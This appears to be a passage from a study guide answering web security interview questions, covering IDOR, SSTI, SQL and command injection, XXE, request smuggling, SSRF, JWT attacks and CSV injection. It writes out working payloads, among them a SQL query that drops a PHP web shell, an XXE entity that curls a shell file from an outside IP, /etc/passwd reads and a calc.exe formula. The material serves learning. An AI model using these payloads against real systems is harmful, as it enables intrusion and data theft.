#### 2) Web Archive (Wayback Machine)
Browsing the web archive is never a bad idea. Web Archive stores information about websites and it can sometimes lead to year even 2010 and before. There could be some interesting info stored there, such as leaked messages, secret information & pages that are no longer available for the public to see.


#### 3) IDOR
I've already covered what that is. We could basically find a endpoint, let's say `/app/user/1337`, which would be us. And by simply changing the value `1337` to something else, we could have other user's information.


This is our normal request, we just want to see our information.
```http
GET /app/user/1337 HTTP/1.1
Host: freeoscp.net
.............
200 OK

{
	"user":"hackerman",
	"email":"hackerman@freeoscp.net"
	"apikey":"13371337"
}

```

Now, let's change the id to different one.
```http
GET /app/user/1338 HTTP/1.1

.............
200 OK

{
	"user":"HackerSploit",
	"email":"hackersploit@metasploit.org"
	"apikey":"SECRETBR0"
}

```

As we can see, we got sensitive data, which are not supposed to be exposed.


## 27. Describe the attributes of a request which make it effectively immune to CSRF (i.e. CSRF mitigation is not required).

#### 1) application/json
 
 CSRF does not work with `application/json` content-type, because HTML forms don't support it via normal request, for that you need to use XHR/fetch API. In order to be immune to CSRF, we also need to block three allowed content-types that can be sent over XHR/fetch and can be used to bypass `application/json` : 
 ```
application/x-www-form-urlencoded
multipart/form-data
text/plain
```


#### 2) JWT
Using JWT completely shuts down CSRF attacks, but opens up more attack towards JWT itself, if configured poorly.


## 28. What are 3 negative outcomes (i.e. bad for the tester) that could arise if “OR true” (or similar) is relied on for SQL injection testing? 👀
I don't really know much about this, but you can check tib3rius's post about it : https://twitter.com/0xTib3rius/status/1616493354006495232



## 29. Name 5 vulnerabilities which could potentially lead to OS command execution on a web app.


#### 1) SSTI
Server-side Template Injection could lead to OS command execution. 
- https://secure-cookie.io/attacks/ssti/
- https://ssti.secure-cookie.io/
Let's suppose we have a vulnerable application, where the backend looks something like this :
```python
@app.route("/", methods=['GET'])
def home():
    try:
        name = request.args.get('name') or None 
        greeting = render_template_string(name)
```

The `request.args.get('name')` is not filtered and thus vulnerable. something simple like `{{7*7}}` is good, then we can try to escalate it to RCE. 


#### 2) SQL injection
SQL injection can lead to RCE as well. For example this payload :
```sql
' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php' #
```
Makes a .php file that contains `<?php system($_GET['cmd']);` and sends it to the root of the webserver - shell.php.

So when, for example, `https://freeoscp.net/shell.php?cmd=id` is called, the output will be an output you'd expect to have when issuing `id` command on your linux machine.


#### 3) LFI2RCE
This exploit is specific to PHP.

**LFI**
- Vulnerability, that arises when `include()` or similar functions are used in a insecure way
- While LFI doesn't need to lead to RCE, it can, for example by using PHP wrappers. (if PHP is used)

Now, one of the interesting PHP wrappers for us, that would allow us to EXECUTE code, is the
`expect://` wrapper.
- Is not enabled by default and is rare
- syntax is trivial - `expect://ls` executes the `ls` command.


And now for the better part -> Using PHP filter chain.

https://github.com/synacktiv/php_filter_chain_generator
This tool generates us from a php code specified the filter payload. The syntax is simple : 
`$ python3 php_filter_chain_generator.py --chain '<php code here>'`


I ain't no expert of why it works, but will add this later, for now you can read an article about it here : 
https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it


#### 4) OS command injection

This "vulnerability" is a classic one, when you will learn more about OS command injection. It is usually presented with a input field, where you can, for example, type an IP address and ping it. If insecure, we can break from the command and make another ones.

Example : 

Let's say we have an application that wants us to write an IP & then ping it.

```php
<?php
$addr = $_GET["addr"];
$output = system("ping -n 5 $addr")
echo "<pre>$output</pre>"
?>
```

Normally, we would request something like `freeoscp.net/?addr=1.3.3.7` and wait for the response. But since we can clearly see, it's not making any checks the input is actually an IP address, we can abuse it by escaping from the ping command. 
`freeoscp.net/?addr=1.3.3.7;ls`

In the backend, this will happen : `ping -n 5 1.3.3.7;ls`. it will execute ping and then ls.


#### 5) XXE 

XXE can lead to RCE via something we've already mentioned -> `expect PHP wrapper`

We can simply host a PHP backdoor on our server (which is port forwarded, so it can interact with the internet), then send a XML payload, like this : 
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE root [  
	<!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:1337/shell.php'">  
]>  
<main>
	<number>1337</number>
	<name>hackerman</name>
	<salary>&file;</salary>
</main>
```
Note, that the XML tags needs to be the same as when issuing a normal request. The only thing we change, is the fact that we are calling the entity, called `$file`.


There are more ways, but the question say "5", so I guess this is enough :-)



## 30. What is prototype pollution, and what exploits could it lead to with both client / server-side variants?

Prototype pollution is a javascript-based vulnerability.





## 31. Describe how you would test for Vertical Access Control vulnerabilities on an application with 20 roles and 300+ different “functional” requests.

This is a really big application and it would take ages to do it manually. I'd find some tools that could help me with it, but right now I don't know any. Something that could help me to manage 20 accounts at the same time while also checking the functions, which I technically could do manually and filter out the useless ones.



## 32. Under what circumstances is a tab’s Session Storage instance preserved?

1) When we reload the website
2) When we go to another tab and then back
3) Closing & reopening the tab also works
4) Browsers, such as Brave (chromium based) have the ability, when the browser "crashes", or just closes unexpected, to restore the session.



## 33. Other than uploading XML via a form, how else might one find and exploit XXE?

#### 1) Profile image upload 
This could work, when .svg file is allowed and the application does not check for the file contents. 

```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
Save this to a file with `.svg` extension and try.


#### 2) SOAP injection

SOAP is a web communicating protocol, that was designed specially for Microsoft. Unlike REST API, which supports BOTH JSON & XML, SOAP supports only XML. 

The main thing for us is, that it uses XML and thus can be vulnerable to XXE. 

Suppose we have an application which would send SOAP message, if we could inject special characters, like <>, we can try to inject malicious XML code : 

```http
POST /soap HTTP/1.1 
Host: freeoscp.net
.........

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxehere SYSTEM "file:///etc/passwd">]>

<SOAP-ENV:Envelope> 
<SOAP-ENV:Body> 
<request> 
	<req>&xxehere;</req> 
</request> 
</SOAP-ENV:Body> 
</SOAP-ENV:Envelope>
```

This is a SOAP/XML injection, where we loaded `/etc/passwd` file.


## 34. Name some common password reset flow vulnerabilities.

#### 1) Password reset poisoning

This is a vulnerability, where we play with the `Host` header. Suppose we have an application that allows us to reset password, if we forget it.

```HTTP
POST /resetPassword HTTP/.1.1
Host: freeoscp.net
...
...

email=victim@hackerman.net
```
This is a normal request, where the `Host` header is untouched. Email will arrive to the victim's mailbox, asking them to reset the password - if they click the link, it will redirect them to `freeoscp.net/reset/?token=SECRETTOKENYES`. Now, what happens, if we manipulate the Host header? Let's try.


```HTTP
POST /resetPassword HTTP/.1.1
Host: attacker-domain.net
...
...

email=victim@hackerman.net
```
We manipulated the Host header via intercept proxy, like Burp or ZAP. You'd expect the website to just say "whatchu doin lol", but in some cases, it will actually forward the request like if nothing happened.

Well, when the victim sees the email, they will not see `freeoscp.net/reset/?token=SECRETTOKENYES`, but `attacker-domain.net/reset/?token=SECRETTOKENYES`. Plus is, when the anchor tag is used like this : 

```html
Hello {name},
you requested to reset your password, please <a href="attacker-domain.net/reset/?token=SECRETTOKENYES">CLICK HERE</a> to reset it.
```

The only thing we need, is the victim to click on the link. They will expose their password reset token to us, which we can use and get into the victim's account.


#### 2) Token doesn't expire
Even if totally random tokens are used and are considered to be secure, this still should be fixed, as something can be even leaked via wayback machine, for example.

The main problem is, when insecure tokens are used, which could actually be easy to brute-force. In this scenario, an attacker could simply brute-force for endpoints like `FUZZ https://freeoscp.net/reset?token=FUZZ`, that could be fatal to many users of the application.



#### 3) User enumeration based on reset message
If emails are supposed to be anonymous (and they should), this could be a risk for the potential victims. Let's say we combine this user enumeration w/ credential stuffing.

Attacker has a list of valid password & emails associated with it. The application's reset function works like that : (pseudocode)

```js
if email exists {
	echo "We've sent you a message how to reset your password."
	//send message code
} else if email does not exist {
	echo "The email doesn't exist bro"
} else {
	echo "Error, reporting to police"
}
```

It is now easy for attacker to enumerate valid users. Even better for them, when rate limit is not in place.


## 35. What is the difference between encoding, encryption, and hashing?

#### Encoding
It's a process, where one data is translated into a new data, with a special format. A great example is Base64. It can also be easily decoded. There's no private key, no hashing.

#### Encryption
It's process, where one data is translated into a new data, but this time, it's not as easy to reverse. The encryption either uses one or two keys to decrypt & encrypt data, and only the users with those keys can decrypt and encrypt the data. Common encryption is AES-256 or AES-512, TLS,...

There are two types of encryption : **symmetric** and **asymmetric**.

Symmetric encryption uses one key for both encryption & decryption, whereas asymmetric uses one key to encrypt the data and the second key to decrypt.


#### Hashing
Hashing is a one-way process the data is hashed and should not be reversable (that's why it's called one-way). (Un)fortunately, lot of hashes have been cracked, such as MD4, MD5, SHA-1,...

A good tool to crack hashes, is `hashcat`, especially their  examples list is really great : https://hashcat.net/wiki/doku.php?id=example_hashes

Hashes can also have salt, which adds random value to it and makes it harder to crack, but the most important part is to use secure hashes, which would be `PBKDF2`, for example.


## 36. Name some ways an attacker might exploit an HTTP Request Smuggling vulnerability.

####  Access Control
<section id="access_control"></section>
HRS can lead to bypassing front-end security mechanism by including a "secret" request, that only the backend can see (thus bypasses the front-end check), leading the backend to think everything's fine.



Let's see an example, we make a request and we want to gain access to `/admin` : 

```HTTP
POST / HTTP/1.1 
Host: freeoscp.net 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 139 
Transfer-Encoding: chunked 


0 


GET /admin/ HTTP/1.1 
Host: freeoscp.net
Content-Type: application/x-www-form-urlencoded 
Content-Length: 10 

x=


```
In this example, the frontend uses `Content-Length`, while the backend uses `Transfer-Encoding. 
Firstly, we write `0`, to tell the backend, that here the request ends and new begins. This will confuse is and everything after it is a normal request. We then include the request to `/admin`, which is our goal. Notice the `x=`, which is used so the next request's headers are not conflicting with ours. The headers will be treated as a request body, so no errors. 

It's also possible, if for some reason the main domain would not be allowed, to change the `Host` header value to local server, like `localhost`, `127.0.0.1`,...


#### Reflected XSS

HRS can also lead to RXSS, which is far better than normal RXSS, because there's no need to click on a link, so no user interaction besides making the next request.

Suppose we have an RXSS in the `Referer` header, where the url is reflected to the website. We could do something like this to make it work :

```HTTP
POST / HTTP/1.1 
Host: freeoscp.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Transfer-Encoding: chunked 


0 


GET / HTTP/1.1 
Host: freeoscp.net
Referer: <script>alert(1337)</script> 
Content-Type: application/x-www-form-urlencoded


x=


```

This is another example of CL.TE vulnerability. Front-end sees the full request, since it uses CL header, whereas backend is confused and sees only the initial request, that ends right after the `0`. 
Now, after smuggling the request, whoever will make the next request, will get spooked by an XSS alert. Again note the `x=`, which is used so it will not be confused with headers by the next request.


#### Web Cache Deception

HRS can even lead to web cache deception. The only drawback of this attack, is that there is no way to know what is victim visiting and thus what URL should we go to to capture the cached request with juicy info.

For the sake of simplicity, let's say the victim only browses to `/acc/profile/my-face.jpg`, because they're narcissist and obsessed with themselves. 

Now, the source code of the `/acc/profile/` contains valuable information, like email, birthday, whatever. If we smuggle a request, which points to `/acc/profile` and the narcissisist user requests `/acc/profile/my-face.jpg`, actually the `/acc/profile` will be cached into my-face.jpg endpoint, so as we know where the user goes, we can happily load the endpoint and enjoy our stolen data. The only downside of this attack in a real scenario is that we don't know where the user makes request, which makes it difficult for us to find out the location where the cached secret info is.

```HTTP
POST / HTTP/1.1
Host: freeoscp.net
Content-Length: 38
Transfer-Encoding: chunked


0


GET /acc/profile HTTP/1.1
Foo: X


```


## 37. What is Server-Side Request Forgery and how can it be detected & exploited?

SSRF is an attack, where we somehow make the server to make a request to an arbitary location, which could cause leaking information, XSPA, bypassing authorization and others.

**XSPA** - Cross-site port attack, we are basically scanning for INTERNAL open ports. It can be either time-based attack, or response-based. (TRUE = 200; FALSE = 500)

A simple scenario would be, if we have an application that uses a function & parameter, like this :

```HTTP
POST /people HTTP/1.1
Host: freeoscp.net
...
...


country=nz&peoplecheck=true&url=peoplecheck.net/check
```
The `/people` endpoint checks for a number of people living in a specified country and uses external API to count it. It then shows the result in the following response. Now, if checking is not in place, we can try to load localhost, like this : 
`country=nz&peoplecheck=true&url=LOCALHOST`
If the check is not in place, it would work and we could see a localhost response. Now suppose we know there's a secret.txt, which is only available to access from localhost, we could simply make a request with `url=localhost/secret.txt` and wait for the response to reveal the secret information.


It can be detected manually, where we could just observe any functionalities, that could interact with external/internal services, or we could spider through the website, find any interesting params (can even be in JSON), and try.


## 38. Name some ways TLS / SSL can be misconfigured.

#### 1) Using old versions of SSL/TLS

There are numerous attacks, most known are probably Heartbleed https://heartbleed.com/ & POODLE https://en.wikipedia.org/wiki/POODLE

The problem here is also, that it seems not many people realize TLS and SSL are not the same. TLS is a successor of SSL, and should be used instead.
<img src="https://github.com/x1trap/websec-answers/assets/81029708/d3dc0451-1b2d-404d-86a9-3cd3c0415479">


#### 2) SSL/TLS stripping

Should this be considered as a misconfig? I don't know, I still included it.


SSL/TLS stripping is a MITM attack, that exploits the fact webserver is not FORCING https, hence it allows the connection to be downgraded and sniffed. The only prerequisite is, that the victim goes to the vulnerable site from an HTTP connection.

While this is an old attack, it will still work on websites, which do not use **HSTS**. It stands for `HTTP Strict Transport Security` and it forces HTTPS connection, always. If it's not used, attacker can use this to their advantage and sniff over the network. Note that there are potential bypasses even when using HSTS, and we should use HSTS preload list, more about it in this article : https://blog.cloudflare.com/performing-preventing-ssl-stripping-a-plain-english-primer/

A tool called `sslstrip2`https://github.com/LeonardoNve/sslstrip2 can help us with the exploitation part. It's an updated version of `sslstrip`, which has the ability to avoid HSTS.


#### 3) Obsolete CBC ciphers supported:

CBC ciphers are not safe, since they are vulnerable to cryptographic flaws. I am not by any means good in cryptography and it's kinda hard topic for me to understand, hence I will throw an article that explain the situation better than I ever could.

https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode



## 39. Give some reasons why sending sensitive data in a URL query parameter is insecure.

#### 1) CSRF-like attack

For example, there could be a URL query `/changepass/?newpass=hackerman&passagain=hackerman`, which, upon visiting, would change our password to hackerman. You think this is absurb, and it really is, but there are sites like this, even in these days. The exploitation is easy, just send the URL query to a victim, make them click on it and it will change their password.

#### 2) Accidental leak

We could accidentally leak it, for example when sharing a screen. Let's say we are on a website `freeoscp.net`, where we would show our friends (if we have any) our wonderful certifications. We would go to our profile section, just to leak our information via the URL. for example, could be something like this : ``freeoscp.net/profile?id=1337&email=xss@xss.xss&single=yes&birthday=14122000`

Again, this seems highly unlikely to happen, but still, you never know.

A more likely example would be, when we would like to share something interesting with our friend, for example :

```txt
I: Hey, wanna see something cool?
F: HELL YEA, SEND IT
I: SURE, HERE 
I : https://freeoscp.net/hackinginstagram/real/token?d=EFW87458FEW687&dumb=yes
F: HAHA FUNNY, I got into your account, hahaha i can see what beer do you drink
I: Please don't send it to my wife
F: Too late.

END
```
Amazing example, I know. But you get the idea.

#### 3) Cross-domain Referer leakage

When, for example, a user click on a link to an arbitrary domain, it will usually include `Referer` header. Let's say we unfortunately have an TOKEN in our URL, and we suddenly click on a link, that redirects us to an another domain. The another domain (third-party) can see the `Referer` header, which looks like this :
`Referer : https://freeoscp.net/nice/token?d=EFW87458FEW68`

The problem here could be, that the third-party can potentially be untrusted, and could be used to make bad things.


## 40. In what ways could an open redirect be exploited?

### 1) Open redirect to JS injection/XSS

This is a classic open redirect escalation. Suppose we have this vulnerable code : 

```js
var urlParams = new URLSearchParams(window.location.search);
var path = urlParams.get('r') ?? '';

location = path;
```
 This code is vulnerable to open redirect, as well as to RXSS. It creates a URL paramter, called r, and then redirect us to whatever we type. Since it does make no check whatsover, we can simply put arbitrary domain and it would successfully redirect. Or, we can inject a javascript URI, something like this : 
 `javascript:alert()`, which would result in an alert popup, confirming we have JS injection. 


#### 2) Phishing

In case we couldn't escalate it to RXSS, we could still achieve a little success with Phishing. We have a several options how to proceed, such as making a fake social media logins, Browser-in-the-browser attacks, trolling, threatening,....

BITB : https://mrd0x.com/browser-in-the-browser-phishing-attack/

#### 3) SSRF but not really

It's good to mention, that while open redirect (client-side) cannot be escalated to SSRF (server-side), the parameter could be used in a different functionality, where it'd actually interact with the server, so it's good to know this.



#### 4) Oauth redirectURI exploit

**What is Oauth:**

Oauth is a authorization mechanism, which manages certain privileges domains have between them. 

An example could be, when we have a website and we want to share photos from `photos.org`. The problem here is, that we only want to share the photos, not anything else - that's why OAuth exists. To ensure the domain has only access to the photos and nothing else. Without it, the domain would have access to everything else as well, which is really unpleasant, because we don't want other domain to know our `photos.org` information.

**What is Oauth `redirect_uri`:**

`redirect_uri` is a paramater, that shows us to which URI should be the user redirected. If handled carelessly, it can be changed to an arbitrary domain and account takeover might be possible.

https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens


## 41. Describe two output encoding techniques and the context in which they should be used to mitigate Cross-site Scripting.

Encoding for HTML contexts -> ``<>'"`
Encoding for JS contexts -> all non-alphanumeric characters -> unicode.
	`\u0022, which is double quotes for example` 


## 42. Describe three “403 Forbidden” bypass techniques.

##### HTTP verb tampering
- An attack where we are changing HTTP methods (GET,PUT,HEAD,TRACE,...)
- It can be used to bypass 403 forbidden, as well as HTTP basic auth.

Here's an example of bypassing HTTP basic auth, suppose the server is based on APACHE :


**.htaccess**
```
<Limit GET>
require valid-user
</Limit>
```
This is a misconfiguration, and we can bypass it by editing the GET request to anything else, most likely we will use POST method.

Instead of `<Limit>`, we should use `<LimitExcept>`.



##### Host header injection

We'll basically can play with the `Host` header. But not only that, the server may support any other headers that can change the host, here's a small list : 
```
X-Originating-IP:
X-Forwarded-For:    
X-Forwarded:   
Forwarded-For:
X-Remote-IP:
X-Remote-Addr:
X-Remote-Addr:
X-Original-URL:
Client-IP:
True-Client-IP:
Cluster-Client-IP:
X-ProxyUser-Ip:
```


#### HTTP Request Smuggling
- Already explained here : [Access-control](#access-control)



#### 4) HTTP version change
In some cases, it is possible to change the version of HTTP to another one.

Suppose we have a `/secret` endpoint and make a request :
```HTTP
GET /secret HTTP/1.1
Host: freeoscp.net
....
...
```
The response is 403 - Forbidden.

Now, we are going to try the bypass method : 
```HTTP
GET /secret HTTP/1.0
Host: freeoscp.net
```

Instead of getting 403 forbidden, we get 200 OK. 
https://infosecwriteups.com/403-bypass-lyncdiscover-microsoft-com-db2778458c33

## 43. Describe some potential CAPTCHA weaknesses.

##### 1) Easy to read by OCR
Some captchas are easy to read and thus it can be easily automated. OCR stands for Optical character recognition, and in simple terms, it's basically reading characters from an image.

A very well known OCR, which could be used is https://github.com/tesseract-ocr/tesseract.
##### 2) Leaked code
It may be possible, that the code is leaked somewhere, in the source code.

##### 3) Using old one
If implemented badly, values of the previous captcha could work. You can solve the first captcha manually, then automate the process by simply saving the value.



## 44. You find XSS in an application, however the customer informs you that users should be able to submit HTML code. What advice would you give them to remain secure?

1) Disable HTML events. They can easily lead to XSS and should not be used, if JS is not needed. You could also use HTML sanitizers for that.
2) Strong CSP + httpOnly + sameSite set.
3) Using separate domain, where it'd be safe to run javascript and stuff, so even if it would get "compromised", nothing could actually be done.


## 45. What are some questions you would ask a customer during a web app pentest scoping call?

This would depends on a lot of factors, most importantly - what am I pentesting. I'd probably ask general questions, like :

1) What is out of scope (both domains & vulnerabilities)
2) What are the main vulnerabilities they look for
3) Any WAF, security measures in place?
4) What should I touch the most and what I shouldn't

That's probably all lol.


## 46. How would you recommend a customer fix an Insecure Deserialization vulnerability?

I'd recommend them to not serialize user-input data at all. 



## 47. Name some user account enumeration techniques.

##### 1) Via password reset
I think this is probably one of the most common technique, I already have written about it here : 

I'll just share my extremely artistic talent and draw how it should look : 
<img src="https://github.com/x1trap/websec-answers/assets/81029708/aa82c21c-4db1-4b56-98ba-d7887237bab3">
This is a secure way how to prevent user enumeration via password reset functionality.

##### 2) Via login/register

**Login method**

Suppose we have an application, where you can login (crazy) and register (wow!). The login works via this way : 
<img src="https://github.com/x1trap/websec-answers/assets/81029708/b9476729-fd44-44b1-893f-b23a51c0ff90"><br>
This is obviously bad, since we can easily enumerate, which username exists and which not.
Instead, it should work like this : <br>
<img src="https://github.com/x1trap/websec-answers/assets/81029708/4c3452f5-1c48-4fa7-a93a-33b0d55774a7"><br>
See the difference? Now the attacker can't tell, if user exists, or not.


**Register method**

This method is harder to prevent, since it's logical to tell a user, that another user already exists. One way to prevent it, is to use email as a username, so when registered, you can tell just simply tell "We've sent you an email with confirmation", whether the email is already registered, or not.


#### 3) DB leaks
If the target got database leak (better with password), which was then leaked to the whole internet, we could download the sample and simply try the credential pairs. If the database is leaked without passwords, it's still useful information, unless the target also changed usernames.


#### 4) Time-based enumeration

Even if it's not directly possible to see if user exists or not, there could be a way to still enumerate -> via the response time. Especially, when the target interacts with external server (for example), which could add some hundreds miliseconds to the response time.

#### 5) HTTP status code.

Let's say we know the endpoint for users profile - `/account/user1337`.
If the user exists, the webserver will throw either 200 OK (We can see the profile), or it will throw a 403 Forbidden (we can't see the profile). Let's say that it will be 403 Forbidden, because the application is supposed to be anonymous.


We can still simply try to write non-existent user, like `/account/4fewrfwefewfew46few64`.

If the response is different from 403 forbidden, such as 404 not found, we can then easily fuzz it, via `ffuf` for example.
`ffuf -w usernames.txt -u https://freeoscp.net/account/FUZZ -fw 404`




## 48. Name some techniques to detect blind/inferential command injection vulnerabilities.

#### 1) SLEEP

`sleep` is a command that is actually used in UNIX systems (OS command injection, as well as in SQL (SQL injection). How it works? It's simple, we issue a sleep command to whatever seconds you want (let's say 5) and if the response load time is 5 seconds, it's vulnerable.

**OS command injection** - ``127.0.0.1 ; sleep 5`
**SQL injection** - `page='AND SLEEP(5)`


#### 2) OOB method (out-of-band)

With this method, we make the target to make a request to our controlled server, to prove that it is, in fact, vulnerable. This can be done for blind SSRF, Command injection, XXE and also blind XSS.

**Blind SSRF**
1) We need to make sure we have a port-forwarded host, or that we are using something like interactsh, or beeceptor.
`?url=https://our-server.net/hi` -> If we can get a request back (so called pingback), it's vulnerable.
We can also try `gopher://`, which can turn blind SSRF into juicy RCE. If gopher is allowed, we can do an attack called XSPA, which basically scans for open ports. Based on what is open, we might exploit it further. To automate the exploitation stuff, we can use this tool, called gopherus. :
 https://github.com/tarunkant/Gopherus
 https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/ - blog


**OS command injection** - `127.0.0.1 ; curl our-server.net`

**Blind XXE**

The exploit works like blind SSRF, we just need to add a little bit of XML along the way : 
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://our-server.net"> ]>

<message>
	<time>&xxe;</time>
	<content>haha</content>
	<messager>1337</messager>
</message>
```
If we get a pingback, we confirm that the vulnerability exists.


**Blind XSS**
I've already wrote about it, we basically can't see the response directly, which means we need to use an external server that would log, if someone got pwned. we can use https://ez.pe for that, or our own server.


## 49. What are some types of race condition vulnerabilities in web applications?

##### Limit overrun (TOCTOU)
One of the most basic examples of rate condition vulnerability. Suppose we have an application, where we could use a free coupon, let's say FREEOSCP, that would give us 20% discount to anything we buy.

Exploitation would look like this :

1) Having a request, which applies the coupon code. - `POST /applyCoupon HTTP1.1`
2) Using burp suite, make copies of this same request, for example 20x
3) Group them
4) Send them all in parallel. This means that all of the requests will be sent at once. 

This is the only RC I know something about. There are other types, but I will look at them later, and so I will throw a nice resources to learn from :
https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html
https://portswigger.net/research/smashing-the-state-machine
https://portswigger.net/web-security/race-conditions


## 50. How does NoSQL Injection differ from SQL Injection?

NoSQL injection has totally different syntax, than traditional SQL injection. Whereas in SQL injection, we exploit databases like mysql, postresql and so on, in NoSQL, we usually exploit the most known example - mariadb.

Let's have a look at typical SQL injection auth bypass :
`admin' or 1=1`

Now, let's compare it to typical NoSQL injection auth bypass : 
`username=hackerman&password[$ne]=realpass` (URL version)
`$[ne]` => not equal, meaning that it will search for the password for the user "hackerman" which does not equal to realpass. This is an NoSQL operator and this attack is called `Operator injection`

The same can be used in JSON data, like this :
```json
{"username":"hackerman", "password": {"$ne": "realpass"} }
```


## 51. Describe the syntax of an HTTP request.

I will present you a wonderful art of mine (Ignore the empty cookie value)

<img src="https://github.com/x1trap/websec-answers/assets/81029708/f973f121-4f49-49b8-92ab-9da1fe857748">

Note that between the `headers` and `request body` parts are always two lines of CRLF characters.
<img src="https://github.com/x1trap/websec-answers/assets/81029708/eec6073b-5d8b-456d-a954-4e40ef2fc126">
All HTTP defined request methods - https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
HTTP headers - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers 
	Note that there can be custom headers, in which case you would need to check docs of the creator of the custom header or find out what it does by yourself.


## 52. Name some potential attacks against JWTs.

#### 1) Not verifying at all

Unfortunately for the developers, they might forget to use `verify()` and instead, just use classic `decode()`, which means the JWT is not checked and therefore we can tamper with the JWT as we like.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "name": "hackerman",
  "iat": 1516239022,
  "admin": false
}

```
In this example, we can just simply change the value of "admin" to true and we are good to go.
#### 2) none algorithm

Every JWT uses an algorithm for signing the token, usually we see HS256, but these are all supported :

```
HS256
HS384
HS512
RS256
RS384
RS512
ES256
ES384
ES512
PS384
PS512
```
And then, there's one, an outstanding one, called `none`. The  none alg is implies that the JWT is "unsigned". This algorithm is insecure and therefore should not be used, but as an attacker, you sometimes may be lucky. 

Let's suppose we have a JWT token, which decoded looks like this : 

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "name": "hackerman",
  "iat": 1516239022,
  "admin": false
}
```
- `alg` is set to HS256
- There's an `admin` paramter, which is set to false.

Well, we can try to modify it, like this 

```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "name": "hackerman",
  "iat": 1516239022,
  "admin": true
}
```
- We changed `alg` to none
- We changed `admin` to true

Simply encode the value back to base64 (that's what JWT uses) and try. 

Lab : https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification




#### 3) JWT HMAC weak secret

HMAC (HS256/HS384/HS512) uses symmetric encryption, meaning that the same key that is used to sign the token is also used to verify it.


Signature verifying is a self-contained process the token itself can be tested for valid passwords without having to send it back to the application to verify it.

If a JWT uses weak secret, that can be easily brute-forced, attacker can then sign their own JWT via the leaked key and, for example, takeover an account of an admin.

Let's suppose we have an application which does use JWT's for authentication, suppose we have this value : 
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImhhY2tlcm1hbiIsImlhdCI6MTUxNjIzOTAyMiwiYWRtaW4iOmZhbHNlfQ.VnnjiYN7yc0awRYAUIXdVL8ML2ktumQm_wkUWFlLuBg
```
It uses a weak secret key, that we can brute-force. While we could use `jwt_tool`, I also want to try something different, so let's do it via `hashcat`. Let's save the JWT token into a file and then execute this command :

`hashcat -a 0 -m 16500 jwt.txt wordlist.txt`

`-a` - attack mode, in this case it's 0, which is dictionary attack.
`-m` - hashmode, it's just a digit code for a hash we are going to crack, 16500 is JWT.
`jwt.txt` - the file with JWT base64 encoded token
`wordlist.txt` - wordlist

The result :

```
Status...........: Cracked

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImhhY2tlcm1hbiIsImlhdCI6MTUxNjIzOTAyMiwiYWRtaW4iOmZhbHNlfQ.VnnjiYN7yc0awRYAUIXdVL8ML2ktumQm_wkUWFlLuBg:password
```




## 53. Describe the process of finding and exploiting a web cache poisoning issue.

#### 1) Unkeyed headers
- We need to find unkeyed headers which the cache ignores, so we can slip the payload to it. We could do this manually, or we could use a burp extension, called Param Miner. 
- https://portswigger.net/web-security/web-cache-poisoning#identify-and-evaluate-unkeyed-inputs


#### 2) How to use the unkeyed headers to our advantage
- After we gain information about headers which are unkeyed, we need to think of a way how could we abuse them. For example, is any of those headers reflected in the response?


#### 3) PWN
- After we find an unkeyed header & a way to exploit it, we're in. Suppose we have a custom unkeyed header, called `Host-Reflected`. We just need to make sure we use cache buster, so no one actually gets the pop-up. so instead of firing it on the main `/` page, we simply add, for example `/?buster=here`. Only those, who will make a request to `/?buster=here`, will get a pop-up.

This example is Cache poisoning to XSS.

```HTTP
GET /?buster=here
Host: freeoscp.net
User-Agent: blah blah
Host-Reflected: "><script>alert(1337)</script>"
...
.
```
When the cache will say "hit", we know we successfully poisoned it, and we can get the bounty $.


## 54. Describe the process of finding and exploiting a Server-Side Template Injection.

First things first, it's good to use an extension that will analyse what the web server uses. `Wappalyzer` is a good one.  We could find that the server uses python, and filter out all of the templates that are not made in python.

Next step would be to find reflected inputs, where we could test for the SSTI. Once we've got that, We could start with basic payloads, like `{{7*7}}, {{config}},...` If any of them would work, now we could copy-paste payloads and try our luck, or we could automate it using https://github.com/vladko312/SSTImap, which would make our job much easier. Just make sure you understand how SSTI works, before automating.

Learn here : https://portswigger.net/web-security/server-side-template-injection


## 55. What is formula injection and how might it be exploited?


Formula injection is also known as CSV injection, it is an exploit used in stylesheets. While it is usually out of scope for bug bounties, and for a good reason, it should not be overlooked. The reason why is it out of scope most of the times, is because there's no easy fix for that.

In CSV format, when we use `=`, we can use a lot of operations on it, such as 
``=MAX(), =MIN(), =1+1,... =cmd|’/C calc.exe’!Z0`
The last one seems a little bit off, right? I agree, that will execute calc.exe via cmd.exe

The exploit works like this :
1) We'll find a functionality, where we can translate something into a .CSV format and we have a control over something that will be outputted via the CSV file.
2) We'll write the payload, such as `=cmd|’/C calc.exe’!Z0` for demonstration, or we could even make a reverse connection via reverse shell. 
3) Profit

Unfortunately for attackers, Excel will alert victim, when something is loaded from outside the Excel, so unless the victim is careless (which they might be actually), we are out of luck/ need a little bit more of social engineering.
